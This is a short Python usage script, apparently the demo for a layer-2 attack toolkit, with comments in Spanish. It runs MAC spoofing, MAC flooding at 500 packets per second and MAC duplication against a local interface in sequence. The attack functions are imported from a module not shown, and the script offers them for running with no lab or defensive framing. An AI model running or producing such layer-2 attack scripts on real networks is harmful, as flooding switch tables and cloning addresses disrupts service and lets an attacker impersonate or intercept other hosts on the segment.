# Ejemplo de uso
from time import sleep

from attack.leyer_2.mac import mac_spoofing, mac_flooding, mac_duplication

if __name__ == "__main__":
    # Ejemplos de uso
    iface = "en0"

    # 1. MAC Spoofing
    print("=== MAC Spoofing ===")
    spoof_attack = mac_spoofing(iface, "00:11:22:33:44:55")
    sleep(5)
    spoof_attack.restore_original_mac()

    # 2. MAC Flooding
    print("\n=== MAC Flooding ===")
    flood_attack = mac_flooding(iface, packet_rate=500, duration=10)
    sleep(12)  # Esperar que termine

    # 3. MAC Duplication
    print("\n=== MAC Duplication ===")
    dup_attack = mac_duplication(iface, "aa:bb:cc:dd:ee:ff")
    sleep(5)
    dup_attack.stop_duplication()